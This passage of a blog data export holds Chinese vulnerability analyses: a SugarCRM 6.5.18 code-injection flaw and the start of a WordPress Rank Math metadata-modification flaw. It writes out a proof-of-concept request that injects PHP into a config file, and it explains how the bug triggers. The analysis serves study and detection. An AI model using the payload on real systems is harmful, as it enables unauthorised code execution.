“a/b/c”\n\n$file参数要是$dir最后一个目录的值加上”.php”,如前面那个例子，这里的即$file = ”c.php”\n\n所以我们要找到一个存在的文件满足如下一个条件，就可以触发漏洞：\n\n<pre class=\"lang:default decode:true \">1、custom/modules/Connectors/connectors/sources/a/b/c/c.php\n2、modules/Connectors/connectors/sources/a/b/c/c.php \n3、connectors/sources/a/b/c/c.php \n</pre>\n\n这里a、b、c可以是任意字符串\n\n我们这里找了一处付符合条件的举例说明：\n\n[![php16](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16-300x276.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16.jpg)\n\n### 漏洞检测\n\n如果对目标网站服务器中的url申请中含有poc中所示的请求，就有极大的可能是攻击行为。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169、486207500\n直接询问：010-68438880-8669","source":"_posts/SugarCRM-RCE.md","raw":"---\ntitle: PHP漏洞跟踪报告\ndate: 2017-11-1 14:30:10\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n由于SugarCRM 6.5.18系统没有对提交的url参数进行过滤，攻击者可以提价一个构造好的url参数，从而将恶意代码写入网站目录中的配置文件中去，配置文件进一步被其他文件包含，导致恶意代码被触发。\n\n<!--more-->[![php1](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1-300x187.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1.jpg)\n\n## 修补情况\n\n**SugarCRM ****新版本中被修复**。\n\n## 参考资料\n\nhttp://seclists.org/fulldisclosure/2016/Jun/51\n\n## 技术细节\n\n现在已知的POC如下图所示：\n\n执行POC，我们可以看到这样的结果\n\n[![php2](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2-300x21.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2.jpg)\n\n执行POC，我们可以看到这样的结果\n\n[![php3](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3-300x212.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3.jpg)\n\n下面我们就要通过poc去分析漏洞的形成原因。\n\n找到文件\\modules\\Connectors\\controller.php\n\n[![php4](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4-300x114.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4.jpg)\n\n<pre class=\"lang:default decode:true \">$source = SourceFactory::getSource($source_id); 这里动态调用了函数getSource()</pre>\n\n我们来看看getSource()函数\n\n[![php5](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5-300x267.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5.jpg)\n\ngetSource()函数在这里包含了\\include\\connectors\\sources\\default\\source.php\n\n我们回头继续看controller.php\n\n[![php6](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6-300x47.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6.jpg)\n\n这里用了个foreach进行遍历，将$_REQUEST提交上来的键名赋值给$name变量、键值赋值给$value变量，然后在判断键名中是否有符合正则表达式\"/^{$source_id}_(.*?)$/\"的匹配内容，并且将匹配值赋值给$matches变量。\n\n我们来看一下poc提交的所有参数\n\n<pre class=\"lang:default decode:true \">module=Connectors&amp;action=RunTest&amp;source_id=ext_rest_insideview&amp;ext_rest_insideview_[%27.phpinfo().%27]=1\n这里参数&amp;source_id值为ext_rest_insideview\n经过匹配，最后的结果为：\n$properties[“[%27.phpinfo().%27]”] = “1”;\n</pre>\n\n接下来看下一条语句\n\n<pre class=\"lang:default decode:true \">$source-&gt;setProperties($properties);\nSet Properties()函数在\\include\\connectors\\sources\\default\\source.php文件中\n</pre>\n\n[![php7](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7-300x68.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7.jpg)\n\n<pre class=\"lang:default decode:true \">这里把$properties数组赋给$this-&gt;_config['properties']，这里相当于生成了一个二维数组。\n并且$this-&gt;_config['encrypt_properties'] =true\n</pre>\n\n然后再看下一行代码\n\n<pre class=\"lang:default decode:true \">$source-&gt;saveConfig();</pre>\n\nsaveConfig()函数同样也在在\\include\\connectors\\sources\\default\\source.php文件中：\n\n[![php8](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8-300x170.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8.jpg)\n\n我们看一下红框里的代码：这里调用了override_value_to_string_recursive2()函数进行拼接字符串，接下来我们看一下override_value_to_string_recursive2()函数。\n\noverride_value_to_string_recursive2()函数位于/include/utils/array_utils.php文件中\n\n[![php9](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9-300x106.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9.jpg)\n\n经过函数处理，最后输出的值应该为$config['properties'][''][''.phpinfo().''] = '1';\n\n然后被写入custom/modules/Connectors/connectors/sources/{$dir}/config.php文件中去。\n\n整体流程下来，我们大概了解了poc的构造原理，也明白了漏洞触发的原因，那么我们再看一下poc\n\n[![php10](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10-300x23.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10.jpg)\n\n这里面的source_id的值即“ext_rest_insideview”字符串貌似没有什么作用啊，看起来只是让source_id的值的后面的变量名前半部分一样就好了。我尝试替换下试试。\n\n[![php11](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11-300x13.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11.jpg)\n\n但是不能触发漏洞，结果如下图\n\n[![php12](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12-300x101.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12.jpg)\n\n发现SourceFactory.php的61行出现错误，我们看一下getSource()中的内容：\n\n[![php13](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13-300x122.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13.jpg)\n\n看来是load函数出现问题了，load()函数位于include/connectors/ConnectorFactory.php中\n\n[![php14](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14-300x151.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14.jpg)\n\n可见load()函数调用了loadclass()函数，根据报出的错误猜测是loadclass()函数没有包含到相应的文件。\n\n我们看一下三条if语句中要包含的文件：\n\n<pre class=\"lang:default decode:true \">custom/modules/Connectors/connectors/{$type}/{$dir}/$file\nmodules/Connectors/connectors/{$type}/{$dir}/$file  \nconnectors/{$type}/{$dir}/$file \n</pre>\n\n在这里，$type参数是固定的，即是SourceFactory.php传入的’sources’\n\n[![php15](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15-300x80.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15.jpg)\n\n$dir参数就是用get传入的source_id拼接的，例如source_id = “a_b_c”， $dir = “a/b/c”\n\n$file参数要是$dir最后一个目录的值加上”.php”,如前面那个例子，这里的即$file = ”c.php”\n\n所以我们要找到一个存在的文件满足如下一个条件，就可以触发漏洞：\n\n<pre class=\"lang:default decode:true \">1、custom/modules/Connectors/connectors/sources/a/b/c/c.php\n2、modules/Connectors/connectors/sources/a/b/c/c.php \n3、connectors/sources/a/b/c/c.php \n</pre>\n\n这里a、b、c可以是任意字符串\n\n我们这里找了一处付符合条件的举例说明：\n\n[![php16](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16-300x276.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16.jpg)\n\n### 漏洞检测\n\n如果对目标网站服务器中的url申请中含有poc中所示的请求，就有极大的可能是攻击行为。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169、486207500\n直接询问：010-68438880-8669","slug":"SugarCRM-RCE","published":1,"updated":"2020-10-27T09:27:09.874Z","_id":"ckgrozu8p001ewsa97sv65njp","comments":1,"layout":"post","photos":[],"link":"","content":"<p>由于SugarCRM 6.5.18系统没有对提交的url参数进行过滤，攻击者可以提价一个构造好的url参数，从而将恶意代码写入网站目录中的配置文件中去，配置文件进一步被其他文件包含，导致恶意代码被触发。</p>\n<a id=\"more\"></a>[![php1](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1-300x187.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1.jpg)\n\n<h2 id=\"修补情况\"><a href=\"#修补情况\" class=\"headerlink\" title=\"修补情况\"></a>修补情况</h2><p><strong>SugarCRM **</strong>新版本中被修复**。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://seclists.org/fulldisclosure/2016/Jun/51\">http://seclists.org/fulldisclosure/2016/Jun/51</a></p>\n<h2 id=\"技术细节\"><a href=\"#技术细节\" class=\"headerlink\" title=\"技术细节\"></a>技术细节</h2><p>现在已知的POC如下图所示：</p>\n<p>执行POC，我们可以看到这样的结果</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2-300x21.jpg\" alt=\"php2\"></a></p>\n<p>执行POC，我们可以看到这样的结果</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3-300x212.jpg\" alt=\"php3\"></a></p>\n<p>下面我们就要通过poc去分析漏洞的形成原因。</p>\n<p>找到文件\\modules\\Connectors\\controller.php</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4-300x114.jpg\" alt=\"php4\"></a></p>\n<pre class=\"lang:default decode:true \">$source = SourceFactory::getSource($source_id); 这里动态调用了函数getSource()</pre>\n\n<p>我们来看看getSource()函数</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5-300x267.jpg\" alt=\"php5\"></a></p>\n<p>getSource()函数在这里包含了\\include\\connectors\\sources\\default\\source.php</p>\n<p>我们回头继续看controller.php</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6-300x47.jpg\" alt=\"php6\"></a></p>\n<p>这里用了个foreach进行遍历，将$_REQUEST提交上来的键名赋值给$name变量、键值赋值给$value变量，然后在判断键名中是否有符合正则表达式”/^{$source_id}_(.*?)$/“的匹配内容，并且将匹配值赋值给$matches变量。</p>\n<p>我们来看一下poc提交的所有参数</p>\n<pre class=\"lang:default decode:true \">module=Connectors&amp;action=RunTest&amp;source_id=ext_rest_insideview&amp;ext_rest_insideview_[%27.phpinfo().%27]=1\n这里参数&amp;source_id值为ext_rest_insideview\n经过匹配，最后的结果为：\n$properties[“[%27.phpinfo().%27]”] = “1”;\n</pre>\n\n<p>接下来看下一条语句</p>\n<pre class=\"lang:default decode:true \">$source-&gt;setProperties($properties);\nSet Properties()函数在\\include\\connectors\\sources\\default\\source.php文件中\n</pre>\n\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7-300x68.jpg\" alt=\"php7\"></a></p>\n<pre class=\"lang:default decode:true \">这里把$properties数组赋给$this-&gt;_config['properties']，这里相当于生成了一个二维数组。\n并且$this-&gt;_config['encrypt_properties'] =true\n</pre>\n\n<p>然后再看下一行代码</p>\n<pre class=\"lang:default decode:true \">$source-&gt;saveConfig();</pre>\n\n<p>saveConfig()函数同样也在在\\include\\connectors\\sources\\default\\source.php文件中：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8-300x170.jpg\" alt=\"php8\"></a></p>\n<p>我们看一下红框里的代码：这里调用了override_value_to_string_recursive2()函数进行拼接字符串，接下来我们看一下override_value_to_string_recursive2()函数。</p>\n<p>override_value_to_string_recursive2()函数位于/include/utils/array_utils.php文件中</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9-300x106.jpg\" alt=\"php9\"></a></p>\n<p>经过函数处理，最后输出的值应该为$config[‘properties’][‘’][‘’.phpinfo().’’] = ‘1’;</p>\n<p>然后被写入custom/modules/Connectors/connectors/sources/{$dir}/config.php文件中去。</p>\n<p>整体流程下来，我们大概了解了poc的构造原理，也明白了漏洞触发的原因，那么我们再看一下poc</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10-300x23.jpg\" alt=\"php10\"></a></p>\n<p>这里面的source_id的值即“ext_rest_insideview”字符串貌似没有什么作用啊，看起来只是让source_id的值的后面的变量名前半部分一样就好了。我尝试替换下试试。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11-300x13.jpg\" alt=\"php11\"></a></p>\n<p>但是不能触发漏洞，结果如下图</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12-300x101.jpg\" alt=\"php12\"></a></p>\n<p>发现SourceFactory.php的61行出现错误，我们看一下getSource()中的内容：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13-300x122.jpg\" alt=\"php13\"></a></p>\n<p>看来是load函数出现问题了，load()函数位于include/connectors/ConnectorFactory.php中</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14-300x151.jpg\" alt=\"php14\"></a></p>\n<p>可见load()函数调用了loadclass()函数，根据报出的错误猜测是loadclass()函数没有包含到相应的文件。</p>\n<p>我们看一下三条if语句中要包含的文件：</p>\n<pre class=\"lang:default decode:true \">custom/modules/Connectors/connectors/{$type}/{$dir}/$file\nmodules/Connectors/connectors/{$type}/{$dir}/$file  \nconnectors/{$type}/{$dir}/$file \n</pre>\n\n<p>在这里，$type参数是固定的，即是SourceFactory.php传入的’sources’</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15-300x80.jpg\" alt=\"php15\"></a></p>\n<p>$dir参数就是用get传入的source_id拼接的，例如source_id = “a_b_c”， $dir = “a/b/c”</p>\n<p>$file参数要是$dir最后一个目录的值加上”.php”,如前面那个例子，这里的即$file = ”c.php”</p>\n<p>所以我们要找到一个存在的文件满足如下一个条件，就可以触发漏洞：</p>\n<pre class=\"lang:default decode:true \">1、custom/modules/Connectors/connectors/sources/a/b/c/c.php\n2、modules/Connectors/connectors/sources/a/b/c/c.php \n3、connectors/sources/a/b/c/c.php \n</pre>\n\n<p>这里a、b、c可以是任意字符串</p>\n<p>我们这里找了一处付符合条件的举例说明：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16-300x276.jpg\" alt=\"php16\"></a></p>\n<h3 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h3><p>如果对目标网站服务器中的url申请中含有poc中所示的请求，就有极大的可能是攻击行为。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169、486207500<br>直接询问：010-68438880-8669</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/如何平衡软件安全领域中的安全开发与安全运营.jpg","excerpt":"<p>由于SugarCRM 6.5.18系统没有对提交的url参数进行过滤，攻击者可以提价一个构造好的url参数，从而将恶意代码写入网站目录中的配置文件中去，配置文件进一步被其他文件包含，导致恶意代码被触发。</p>","more":"[![php1](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1-300x187.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1.jpg)\n\n<h2 id=\"修补情况\"><a href=\"#修补情况\" class=\"headerlink\" title=\"修补情况\"></a>修补情况</h2><p><strong>SugarCRM **</strong>新版本中被修复**。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://seclists.org/fulldisclosure/2016/Jun/51\">http://seclists.org/fulldisclosure/2016/Jun/51</a></p>\n<h2 id=\"技术细节\"><a href=\"#技术细节\" class=\"headerlink\" title=\"技术细节\"></a>技术细节</h2><p>现在已知的POC如下图所示：</p>\n<p>执行POC，我们可以看到这样的结果</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2-300x21.jpg\" alt=\"php2\"></a></p>\n<p>执行POC，我们可以看到这样的结果</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3-300x212.jpg\" alt=\"php3\"></a></p>\n<p>下面我们就要通过poc去分析漏洞的形成原因。</p>\n<p>找到文件\\modules\\Connectors\\controller.php</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4-300x114.jpg\" alt=\"php4\"></a></p>\n<pre class=\"lang:default decode:true \">$source = SourceFactory::getSource($source_id); 这里动态调用了函数getSource()</pre>\n\n<p>我们来看看getSource()函数</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5-300x267.jpg\" alt=\"php5\"></a></p>\n<p>getSource()函数在这里包含了\\include\\connectors\\sources\\default\\source.php</p>\n<p>我们回头继续看controller.php</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6-300x47.jpg\" alt=\"php6\"></a></p>\n<p>这里用了个foreach进行遍历，将$_REQUEST提交上来的键名赋值给$name变量、键值赋值给$value变量，然后在判断键名中是否有符合正则表达式”/^{$source_id}_(.*?)$/“的匹配内容，并且将匹配值赋值给$matches变量。</p>\n<p>我们来看一下poc提交的所有参数</p>\n<pre class=\"lang:default decode:true \">module=Connectors&amp;action=RunTest&amp;source_id=ext_rest_insideview&amp;ext_rest_insideview_[%27.phpinfo().%27]=1\n这里参数&amp;source_id值为ext_rest_insideview\n经过匹配，最后的结果为：\n$properties[“[%27.phpinfo().%27]”] = “1”;\n</pre>\n\n<p>接下来看下一条语句</p>\n<pre class=\"lang:default decode:true \">$source-&gt;setProperties($properties);\nSet Properties()函数在\\include\\connectors\\sources\\default\\source.php文件中\n</pre>\n\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7-300x68.jpg\" alt=\"php7\"></a></p>\n<pre class=\"lang:default decode:true \">这里把$properties数组赋给$this-&gt;_config['properties']，这里相当于生成了一个二维数组。\n并且$this-&gt;_config['encrypt_properties'] =true\n</pre>\n\n<p>然后再看下一行代码</p>\n<pre class=\"lang:default decode:true \">$source-&gt;saveConfig();</pre>\n\n<p>saveConfig()函数同样也在在\\include\\connectors\\sources\\default\\source.php文件中：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8-300x170.jpg\" alt=\"php8\"></a></p>\n<p>我们看一下红框里的代码：这里调用了override_value_to_string_recursive2()函数进行拼接字符串，接下来我们看一下override_value_to_string_recursive2()函数。</p>\n<p>override_value_to_string_recursive2()函数位于/include/utils/array_utils.php文件中</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9-300x106.jpg\" alt=\"php9\"></a></p>\n<p>经过函数处理，最后输出的值应该为$config[‘properties’][‘’][‘’.phpinfo().’’] = ‘1’;</p>\n<p>然后被写入custom/modules/Connectors/connectors/sources/{$dir}/config.php文件中去。</p>\n<p>整体流程下来，我们大概了解了poc的构造原理，也明白了漏洞触发的原因，那么我们再看一下poc</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10-300x23.jpg\" alt=\"php10\"></a></p>\n<p>这里面的source_id的值即“ext_rest_insideview”字符串貌似没有什么作用啊，看起来只是让source_id的值的后面的变量名前半部分一样就好了。我尝试替换下试试。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11-300x13.jpg\" alt=\"php11\"></a></p>\n<p>但是不能触发漏洞，结果如下图</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12-300x101.jpg\" alt=\"php12\"></a></p>\n<p>发现SourceFactory.php的61行出现错误，我们看一下getSource()中的内容：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13-300x122.jpg\" alt=\"php13\"></a></p>\n<p>看来是load函数出现问题了，load()函数位于include/connectors/ConnectorFactory.php中</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14-300x151.jpg\" alt=\"php14\"></a></p>\n<p>可见load()函数调用了loadclass()函数，根据报出的错误猜测是loadclass()函数没有包含到相应的文件。</p>\n<p>我们看一下三条if语句中要包含的文件：</p>\n<pre class=\"lang:default decode:true \">custom/modules/Connectors/connectors/{$type}/{$dir}/$file\nmodules/Connectors/connectors/{$type}/{$dir}/$file  \nconnectors/{$type}/{$dir}/$file \n</pre>\n\n<p>在这里，$type参数是固定的，即是SourceFactory.php传入的’sources’</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15-300x80.jpg\" alt=\"php15\"></a></p>\n<p>$dir参数就是用get传入的source_id拼接的，例如source_id = “a_b_c”， $dir = “a/b/c”</p>\n<p>$file参数要是$dir最后一个目录的值加上”.php”,如前面那个例子，这里的即$file = ”c.php”</p>\n<p>所以我们要找到一个存在的文件满足如下一个条件，就可以触发漏洞：</p>\n<pre class=\"lang:default decode:true \">1、custom/modules/Connectors/connectors/sources/a/b/c/c.php\n2、modules/Connectors/connectors/sources/a/b/c/c.php \n3、connectors/sources/a/b/c/c.php \n</pre>\n\n<p>这里a、b、c可以是任意字符串</p>\n<p>我们这里找了一处付符合条件的举例说明：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP16-300x276.jpg\" alt=\"php16\"></a></p>\n<h3 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h3><p>如果对目标网站服务器中的url申请中含有poc中所示的请求，就有极大的可能是攻击行为。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169、486207500<br>直接询问：010-68438880-8669</p>"},{"title":"WordPress Rank Math SEO插件任意元数据修改漏洞分析","date":"2020-04-16T06:36:37.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5f6ca87fda316a1b5a989b5d286a918.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nRank Math是一款旨在帮助搜索引擎优化的WordPress插件，被称之为“WordPress SEO的瑞士军刀”。 Rank Math与Yoast SEO、All in One SEO Pack下载量排WordPress SEO工具下载量前三，但其功能方面完全不输Yoast付费版，几乎可以满足用户对SEO的所有需求。更重要的是，Rank Math是一款免费插件。\n\n<!--more-->\n\n漏洞描述\n--------\n\n近日有研究团队发现，Rank Math插件中存在一个严重的漏洞，未经身份验证的攻击者可以利用该漏洞更新WordPress站点中的任意元数据。这将导致攻击者可以修改任意现有的文章、评论，跟或是将普通权限的用户提权为管理员，将管理员权限用户降级。\n\n漏洞分析\n--------\n\n首先我们来看一下Rank Math插件中的漏洞触发点\n\n漏洞触发点位于\\\\wp-content\\\\plugins\\\\seo-by-rank-math\\\\includes\\\\rest\\\\class-admin.php，见下图:\n\n![6e9b1fd60b8e1a6d934ef7e1c6b3c05b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142425-eb043ce0-7faa-1.png)\n\n通过上图可见，class-admin.php文件中的gutenberg_routes方法通过register_rest_route方法注册了一个自定义接口\n\n当该自定义接口被调用后，$this->update_metadata方法将作为回调函数被调用。见下图红框处：\n\n![4e8777ce7736d41e89dc60c51fb10859.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142437-f285ead6-7faa-1.png)\n\n接下来看一下$this->update_metadata方法，仍然是位于\\wp-content\\plugins\\seo-by-rank-math\\includes\\rest\\class-admin.php中。见下图：\n\n![2b09038ee7b7fc4bf4485395e487dc8d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142454-fc7b3cda-7faa-1.png)\n\n首先分析$this->update_metadata方法中传入的参数。见下图红框处\n\n![c9aa3ac8a4bea18330c48e3fd2046b5d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142521-0c590bf0-7fab-1.png)\n\n$this->update_metadata方法从请求的参数中获取objectID、objectType与meta三个参数，分别赋值给$object_id、$object_type与$meta\n\n接着从$meta取出键值对，并与$object_id、$object_type参数一同传递给update_metadata方法。如下图：\n\n![40e68f1f1c8afe31db270e0d61712214.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142546-1bb2ce10-7fab-1.png)\n\n我们具体分析一下上图中的update_metadata方法。update_metadata方法位于\\wp-includes\\meta.php文件中。见下图：\n\n![d66963aea399a33288c2f1d0ee7ff316.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142611-2a28fcc6-7fab-1.png)\n\nupdate_metadata方法是wordpress中用来操作元数据的操作函数，其作用是更新指定对象的元数据。\n\n本次漏洞可以利用该update_metadata函数更新任意指定元数据。那不得不提一下wordpress元数据是什么\n\n### 什么是元数据（Metadata）\n\n元数据可描述为关于数据的数据。通常元数据有如下两种：\n\n**1、结构化的元数据（Structural metadata）**是有关数据结构的设计和说明，通常叫做“关于数据容器的数据（data about the containers of data）；\n\n**2、描述性的元数据（descriptive metadata）**，关于应用程序数据和数据内容的单个实例。\n\n我们首先看下wordpress开发手册上关于元数据的解释：\n\n“元数据根据其定义，是有关信息的信息。\n在WordPress的情况下，它是与帖子，用户，评论和条款相关的信息。”\n\n这里的定义不是很好理解，关于元数据，《深入理解 WordPress 